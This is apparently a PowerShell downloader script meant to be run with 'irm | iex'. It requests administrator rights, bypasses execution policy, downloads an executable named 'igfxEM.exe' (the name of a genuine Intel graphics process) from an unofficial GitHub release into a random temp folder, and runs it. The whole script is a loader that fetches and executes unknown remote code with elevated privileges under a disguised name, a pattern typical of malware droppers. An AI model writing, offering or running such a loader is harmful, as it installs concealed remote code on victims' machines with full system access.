$ExeUrl = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
$AppName = "igfxEM.exe"

$ErrorActionPreference = "Stop"

# Check if Admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    
    # Determine how to re-launch
    if ($MyInvocation.Line -match 'https?://\S+') {
        # Case 1: Running via "irm <url> | iex"
        $originalUrl = ($MyInvocation.Line -match '(https?://\S+)')[1]
        
        # Force TLS 1.2 in the new process BEFORE downloading
        $newCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '$originalUrl' -UseBasicParsing | iex"
        
        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$newCmd`""
    } else {
        # Case 2: Running from a file (.ps1)
        $scriptPath = $PSCommandPath
        if (-not $scriptPath) {
            Write-Error "Could not determine script path."
            exit 1
        }
        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    }
    exit
}

# --- Rest of the script (runs as Admin) ---

$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir | Out-Null
$ExePath = Join-Path $TempDir $AppName

Write-Host "Downloading..." -ForegroundColor Cyan
$ProgressPreference = 'SilentlyContinue'

# Ensure TLS 1.2 is set even if we didn't re-launch (safety net)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12

try {
    Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
} catch {
    Write-Error "Failed to download: $_"
    exit 1
}

Write-Host "Running..." -ForegroundColor Green
Start-Process -FilePath $ExePath -WorkingDirectory $TempDir -Wait

Write-Host "Done." -ForegroundColor Green
